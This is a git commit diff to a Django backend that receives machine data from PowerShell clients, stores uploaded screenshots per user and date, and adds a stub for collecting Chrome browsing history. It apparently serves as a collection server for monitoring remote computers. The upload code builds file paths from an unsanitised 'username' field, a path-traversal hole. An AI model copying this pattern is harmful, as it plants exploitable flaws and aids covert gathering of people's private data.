16b7d3b4e775fedaffc020d6402f1768a9ebd4d2
grimange <ramjfive24@gmail.com>
2025-03-08 06:21:55 +0800

    Add support for file uploads and Chrome history handling
    Introduce a new file upload mechanism with custom filename generation and directory structure, alongside backend integration for saving screenshots. Add a placeholder API endpoint for handling Chrome history data.

--- remoteDesktops/views.py
+++ remoteDesktops/views.py
@@ -1,12 +1,16 @@
-import json
-
+import os
+from uuid import uuid4
+from datetime import datetime
+from django.core.files.storage import default_storage
+from django.core.files.base import ContentFile
 from rest_framework.decorators import api_view, permission_classes
 from rest_framework.permissions import IsAuthenticated
 from rest_framework.parsers import MultiPartParser, FormParser
 from rest_framework.response import Response
 from rest_framework import status
 from rest_framework.views import APIView
-from remoteDesktops.models import Desktop
+from remoteDesktops.models import Desktop, Screenshot
+
 
 def get_client_ip(request):
     """Retrieve the real public IP address of the user."""
@@ -20,24 +24,46 @@ def get_client_ip(request):
 @api_view(['POST'])
 @permission_classes([IsAuthenticated])
 def receive_data(request):
-    """Receives data from PowerShell"""
+    """Receives data from Machine."""
     try :
         data = request.data
         data['geo_location']['ip_address'] = get_client_ip(request)
-        Desktop.objects.record(request.data)
+        Desktop.objects.record_machine(request.data)
     except Exception as error:
         return Response({"error": str(error)}, status=400)
     return Response({"message": "Data received successfully"}, status=status.HTTP_200_OK)
 
+@api_view(['POST'])
+@permission_classes([IsAuthenticated])
+def receive_chrome_history(request):
+    try:
+        pass
+    except Exception as error:
+        return Response({"error": str(error)}, status=400)
+    return Response({"message": "Data received successfully"}, status=status.HTTP_200_OK)
 
 @permission_classes([IsAuthenticated])
 class FileUploadView(APIView):
     parser_classes = (MultiPartParser, FormParser)
 
-    def post(self, request, *args, **kwargs):
-        file = request.FILES.get('file')
-        if file:
-            # Save file or process it
-            return Response({"message": "File uploaded successfully", "filename": file.name})
-        return Response({"error": "No file uploaded"}, status=400)
+    @staticmethod
+    def generate_filename(name):
+        file_extension = os.path.splitext(name)[1]
+        return f"{uuid4().hex}{file_extension}"
 
+    def post(self, request, *args, **kwargs):
+        try:
+            file = request.FILES.get('file')
+            if file:
+                username = request.POST.get('username')
+                guid = request.POST.get('guid')
+
+                today = datetime.today().strftime("%Y-%m-%d")
+                save_path = os.path.join("static/assets/images", username, today)
+                file_path = os.path.join(save_path, self.generate_filename(file.name))
+                file_name = default_storage.save(file_path, ContentFile(file.read()))
+
+                return Response(Screenshot.objects.save_image(username, guid, file_name), status=status.HTTP_200_OK)
+            return Response({"error": "No file uploaded"}, status=400)
+        except Exception as error:
+            return Response({"error": str(error)}, status=400)
